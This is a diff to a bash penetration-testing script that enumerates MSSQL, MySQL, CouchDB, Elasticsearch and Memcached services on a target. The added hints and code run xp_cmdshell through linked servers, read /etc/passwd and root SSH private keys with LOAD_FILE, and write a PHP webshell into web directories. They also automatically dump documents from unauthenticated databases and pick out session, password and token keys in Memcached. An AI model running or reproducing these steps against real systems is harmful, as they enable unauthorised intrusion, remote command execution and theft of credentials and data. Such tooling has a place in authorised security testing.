@@ -101,6 +101,15 @@ if has_port 1433; then
 
   # Enumerate databases:
   SQL> SELECT name FROM master.dbo.sysdatabases;"
+
+    hint "MSSQL Linked Servers (lateral movement):
+  # Connect first:
+  impacket-mssqlclient <user>:<pass>@${TARGET} -windows-auth
+  # Inside mssqlclient:
+  SQL> SELECT name, data_source FROM sys.linked_servers;
+  SQL> EXEC ('SELECT @@version') AT [linked_server_name];
+  SQL> EXEC ('SELECT name FROM sys.databases') AT [linked_server_name];
+  SQL> EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];"
     echo ""
 fi
 
@@ -138,6 +147,17 @@ if has_port 3306; then
   mysql> SHOW DATABASES;
   mysql> SELECT user,authentication_string FROM mysql.user;
   mysql> SELECT @@datadir;"
+
+    hint "MySQL file read/write (if FILE privilege available):
+  # Check privilege:
+  SHOW GRANTS FOR CURRENT_USER();
+  SHOW VARIABLES LIKE 'secure_file_priv';    -- empty = no restriction
+  # Read files:
+  SELECT LOAD_FILE('/etc/passwd');
+  SELECT LOAD_FILE('/root/.ssh/id_rsa');
+  # Write webshell (if web root known):
+  SELECT '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/cmd.php';
+  SELECT '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/uploads/cmd.php';"
     echo ""
 fi
 
@@ -274,42 +294,46 @@ if has_port 27017; then
     echo ""
 fi
 
-# ===========================================================================
-# CouchDB — port 5984
-# ===========================================================================
-if has_port 5984; then
-    info "[6/7] CouchDB (5984) — unauthenticated HTTP API check"
-    COUCH_DIR="${OUTPUT_DIR}/db"
-    COUCH_OUT="${COUCH_DIR}/couchdb.txt"
+# ---------------------------------------------------------------------------
+# CouchDB (5984)
+# ---------------------------------------------------------------------------
+if echo "$PORTS" | grep -qw "5984"; then
+    COUCH_DIR="${OUTPUT_DIR}/db/couchdb"
+    mkdir -p "$COUCH_DIR"
+    info "[CouchDB] CouchDB enumeration on port 5984"
 
-    # Root endpoint — reveals version and UUID
-    cmd "curl -sk http://$TARGET:5984/"
-    curl -sk --max-time 10 "http://${TARGET}:5984/" \
-        2>&1 | tee "$COUCH_OUT" || true
+    cmd "curl -sk http://${TARGET}:5984/"
+    COUCH_ROOT=$(curl -sk --max-time 10 "http://${TARGET}:5984/" 2>/dev/null || true)
+    echo "$COUCH_ROOT" > "${COUCH_DIR}/couch_root.txt"
 
-    if grep -qi '"couchdb"' "$COUCH_OUT" 2>/dev/null; then
-        ok "CouchDB responded to unauthenticated request — access confirmed"
-        COUCH_VER=$(grep -oP '"version"\s*:\s*"\K[^"]+' "$COUCH_OUT" 2>/dev/null | head -1 || true)
-        [[ -n "$COUCH_VER" ]] && ok "CouchDB version: ${WHITE}${COUCH_VER}${NC}"
+    if echo "$COUCH_ROOT" | grep -qi '"couchdb"'; then
+        COUCH_VER=$(echo "$COUCH_ROOT" | grep -oP '"version"\s*:\s*"\K[^"]+' || true)
+        ok "CouchDB ${WHITE}${COUCH_VER}${NC} accessible without authentication"
+        warn "CouchDB unauthenticated access — HIGH severity"
 
-        # List all databases
-        cmd "curl -sk http://$TARGET:5984/_all_dbs"
+        # List databases
+        cmd "curl -sk http://${TARGET}:5984/_all_dbs"
         curl -sk --max-time 10 "http://${TARGET}:5984/_all_dbs" \
-            2>&1 | tee "${COUCH_DIR}/couchdb_dbs.txt" || true
+            2>/dev/null | tee "${COUCH_DIR}/couch_dbs.txt" || true
 
-        if grep -qi '\[' "${COUCH_DIR}/couchdb_dbs.txt" 2>/dev/null; then
-            ok "CouchDB databases: $(cat "${COUCH_DIR}/couchdb_dbs.txt")"
-            warn "CouchDB allows unauthenticated database listing — review for sensitive data"
-        fi
+        # Check Futon/Fauxton admin panel
+        FUTON_CODE=$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \
+            "http://${TARGET}:5984/_utils/" 2>/dev/null || true)
+        [[ "$FUTON_CODE" == "200" ]] && warn "CouchDB admin panel (Fauxton) accessible at http://${TARGET}:5984/_utils/"
 
-        # Check /_utils (Fauxton admin UI)
-        cmd "curl -sk -o /dev/null -w '%{http_code}' http://$TARGET:5984/_utils/"
-        FAUXTON_CODE=$(curl -sk -o /dev/null -w '%{http_code}' \
-            --max-time 5 "http://${TARGET}:5984/_utils/" 2>/dev/null || echo "000")
-        [[ "$FAUXTON_CODE" == "200" ]] && \
-            warn "CouchDB Fauxton admin UI accessible at http://${TARGET}:5984/_utils/"
+        # Dump first 5 docs from each database
+        DB_LIST=$(curl -sk --max-time 10 "http://${TARGET}:5984/_all_dbs" 2>/dev/null \
+            | grep -oP '"[^"_][^"]*"' | tr -d '"' | head -10 || true)
+        while IFS= read -r db_name; do
+            [[ -z "$db_name" ]] && continue
+            cmd "curl -sk http://${TARGET}:5984/${db_name}/_all_docs?limit=5"
+            curl -sk --max-time 10 \
+                "http://${TARGET}:5984/${db_name}/_all_docs?limit=5&include_docs=true" \
+                2>/dev/null | tee "${COUCH_DIR}/couch_db_${db_name}.txt" || true
+            ok "CouchDB database ${WHITE}${db_name}${NC} → ${COUCH_DIR}/couch_db_${db_name}.txt"
+        done <<< "$DB_LIST"
     else
-        info "CouchDB root did not return expected JSON — may require authentication."
+        info "CouchDB requires authentication or not responding."
     fi
 
     hint "CouchDB manual steps:
@@ -327,64 +351,112 @@ if has_port 5984; then
     echo ""
 fi
 
-# ===========================================================================
-# Elasticsearch — port 9200
-# ===========================================================================
-if has_port 9200; then
-    info "[7/7] Elasticsearch (9200) — unauthenticated REST API check"
-    ES_DIR="${OUTPUT_DIR}/db"
-    ES_OUT="${ES_DIR}/elasticsearch.txt"
+# ---------------------------------------------------------------------------
+# Elasticsearch (9200)
+# ---------------------------------------------------------------------------
+if echo "$PORTS" | grep -qw "9200" || echo "$PORTS" | grep -qw "9300"; then
+    ES_PORT=$(echo "$PORTS" | grep -oP '9[23]00' | head -1 || true)
+    ES_PORT="${ES_PORT:-9200}"
+    ES_DIR="${OUTPUT_DIR}/db/elasticsearch"
+    mkdir -p "$ES_DIR"
+    info "[ES] Elasticsearch enumeration on port ${ES_PORT}"
 
-    # Cluster info endpoint
-    cmd "curl -sk http://$TARGET:9200/"
-    curl -sk --max-time 10 "http://${TARGET}:9200/" \
-        2>&1 | tee "$ES_OUT" || true
+    # Version + cluster info
+    cmd "curl -sk http://${TARGET}:${ES_PORT}/"
+    ES_ROOT=$(curl -sk --max-time 10 "http://${TARGET}:${ES_PORT}/" 2>/dev/null || true)
+    echo "$ES_ROOT" > "${ES_DIR}/es_root.txt"
 
-    if grep -qi '"cluster_name"\|"version"' "$ES_OUT" 2>/dev/null; then
-        ok "Elasticsearch responded — unauthenticated access confirmed"
-        ES_VER=$(grep -oP '"number"\s*:\s*"\K[^"]+' "$ES_OUT" 2>/dev/null | head -1 || true)
-        ES_CLUSTER=$(grep -oP '"cluster_name"\s*:\s*"\K[^"]+' "$ES_OUT" 2>/dev/null | head -1 || true)
-        [[ -n "$ES_VER" ]]     && ok "Elasticsearch version: ${WHITE}${ES_VER}${NC}"
-        [[ -n "$ES_CLUSTER" ]] && ok "Cluster name: ${WHITE}${ES_CLUSTER}${NC}"
+    if echo "$ES_ROOT" | grep -qi '"name"'; then
+        ES_VERSION=$(echo "$ES_ROOT" | grep -oP '"number"\s*:\s*"\K[^"]+' || true)
+        ES_CLUSTER=$(echo "$ES_ROOT" | grep -oP '"cluster_name"\s*:\s*"\K[^"]+' || true)
+        ok "Elasticsearch ${WHITE}${ES_VERSION}${NC} — cluster: ${WHITE}${ES_CLUSTER}${NC}"
+        warn "Elasticsearch accessible WITHOUT authentication — HIGH severity"
 
-        # List all indices
-        cmd "curl -sk http://$TARGET:9200/_cat/indices?v"
-        curl -sk --max-time 10 "http://${TARGET}:9200/_cat/indices?v" \
-            2>&1 | tee "${ES_DIR}/elasticsearch_indices.txt" || true
+        # List indices
+        cmd "curl -sk http://${TARGET}:${ES_PORT}/_cat/indices?v"
+        curl -sk --max-time 15 "http://${TARGET}:${ES_PORT}/_cat/indices?v" \
+            2>/dev/null | tee "${ES_DIR}/es_indices.txt" || true
 
-        INDEX_COUNT=$(grep -cvP '^health' "${ES_DIR}/elasticsearch_indices.txt" 2>/dev/null || echo 0)
-        [[ "$INDEX_COUNT" -gt 0 ]] && \
-            warn "Elasticsearch: ${INDEX_COUNT} index/indices found — review for sensitive data"
+        # Node info
+        cmd "curl -sk http://${TARGET}:${ES_PORT}/_cat/nodes?v"
+        curl -sk --max-time 10 "http://${TARGET}:${ES_PORT}/_cat/nodes?v" \
+            2>/dev/null | tee "${ES_DIR}/es_nodes.txt" || true
 
-        # Cluster health
-        cmd "curl -sk http://$TARGET:9200/_cluster/health"
-        curl -sk --max-time 10 "http://${TARGET}:9200/_cluster/health" \
-            2>&1 | tee "${ES_DIR}/elasticsearch_health.txt" || true
+        # Dump first document from each index
+        if [[ -s "${ES_DIR}/es_indices.txt" ]]; then
+            INDEX_NAMES=$(grep -oP '^\S+' "${ES_DIR}/es_indices.txt" \
+                | grep -v '^index' | head -10 || true)
+            while IFS= read -r idx_name; do
+                [[ -z "$idx_name" ]] && continue
+                cmd "curl -sk http://${TARGET}:${ES_PORT}/${idx_name}/_search?size=1"
+                curl -sk --max-time 10 \
+                    "http://${TARGET}:${ES_PORT}/${idx_name}/_search?size=1" \
+                    2>/dev/null | tee "${ES_DIR}/es_idx_${idx_name}.txt" || true
+                ok "Index ${WHITE}${idx_name}${NC} sample → ${ES_DIR}/es_idx_${idx_name}.txt"
+            done <<< "$INDEX_NAMES"
+        fi
 
-        # Nodes info (reveals hostnames and versions)
-        cmd "curl -sk http://$TARGET:9200/_nodes"
-        curl -sk --max-time 10 "http://${TARGET}:9200/_nodes" \
-            2>&1 | tee "${ES_DIR}/elasticsearch_nodes.txt" || true
+        hint "Elasticsearch full dump:
+  curl -sk 'http://${TARGET}:${ES_PORT}/_search?size=1000&pretty'
+  curl -sk 'http://${TARGET}:${ES_PORT}/_all/_search?size=100&pretty'
+  # Check for passwords/credentials in data:
+  curl -sk 'http://${TARGET}:${ES_PORT}/_all/_search?q=password&pretty'"
     else
-        info "Elasticsearch did not return expected JSON — may require authentication."
+        info "Elasticsearch requires authentication or port not responding."
     fi
+fi
 
-    hint "Elasticsearch manual steps:
-  # Cluster info:
-  curl http://${TARGET}:9200/
+# ---------------------------------------------------------------------------
+# Memcached (11211)
+# ---------------------------------------------------------------------------
+if echo "$PORTS" | grep -qw "11211"; then
+    MEMC_DIR="${OUTPUT_DIR}/db/memcached"
+    mkdir -p "$MEMC_DIR"
+    info "[Memcached] Memcached enumeration on port 11211"
 
-  # List indices:
-  curl http://${TARGET}:9200/_cat/indices?v
+    # Stats
+    cmd "echo 'stats' | nc -w 3 ${TARGET} 11211"
+    MEMC_STATS=$(echo "stats" | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
+    echo "$MEMC_STATS" > "${MEMC_DIR}/memcached_stats.txt"
 
-  # Dump all documents from an index:
-  curl http://${TARGET}:9200/<INDEX>/_search?size=100\&pretty
+    if [[ -n "$MEMC_STATS" ]]; then
+        MEMC_VER=$(echo "$MEMC_STATS" | grep -oP 'STAT version \K\S+' || true)
+        ok "Memcached ${WHITE}${MEMC_VER}${NC} — NO authentication required"
+        warn "Memcached unauthenticated access — can read all cached data"
 
-  # Search for passwords:
-  curl http://${TARGET}:9200/_search?q=password\&pretty
+        # Get slab info to find active slabs
+        cmd "echo 'stats slabs' | nc -w 3 ${TARGET} 11211"
+        MEMC_SLABS=$(echo "stats slabs" | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
+        echo "$MEMC_SLABS" > "${MEMC_DIR}/memcached_slabs.txt"
 
-  # If TLS / authentication required:
-  curl -sk -u elastic:changeme https://${TARGET}:9200/"
-    echo ""
+        # Dump keys from each active slab
+        SLAB_IDS=$(echo "$MEMC_SLABS" | grep -oP 'STAT (\d+):' \
+            | grep -oP '\d+' | sort -un | head -20 || true)
+        > "${MEMC_DIR}/memcached_keys.txt"
+
+        while IFS= read -r slab_id; do
+            [[ -z "$slab_id" ]] && continue
+            KEY_DUMP=$(printf "stats cachedump %s 100\r\n" "$slab_id" \
+                | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
+            echo "$KEY_DUMP" >> "${MEMC_DIR}/memcached_keys.txt"
+        done <<< "$SLAB_IDS"
+
+        KEY_COUNT=$(grep -c '^ITEM' "${MEMC_DIR}/memcached_keys.txt" 2>/dev/null || echo 0)
+        ok "Memcached keys found: ${WHITE}${KEY_COUNT}${NC} → ${MEMC_DIR}/memcached_keys.txt"
+
+        # Flag interesting keys
+        INTERESTING=$(grep -iE 'session|password|passwd|token|auth|user|secret|key|cred' \
+            "${MEMC_DIR}/memcached_keys.txt" 2>/dev/null || true)
+        [[ -n "$INTERESTING" ]] && warn "Interesting keys found:\n${INTERESTING}"
+
+        hint "Memcached — get value of a key:
+  echo 'get <key_name>' | nc -w 2 ${TARGET} 11211
+  # Dump all keys and values:
+  for key in \$(echo 'stats cachedump 1 100' | nc -w 2 ${TARGET} 11211 | grep -oP 'ITEM \K[^ ]+'); do
+      echo \"=== \$key ===\"; echo \"get \$key\" | nc -w 2 ${TARGET} 11211; done"
+    else
+        info "Memcached not responding or port closed."
+    fi
 fi
 
 ok "Database enumeration complete — output: ${DB_DIR}/"
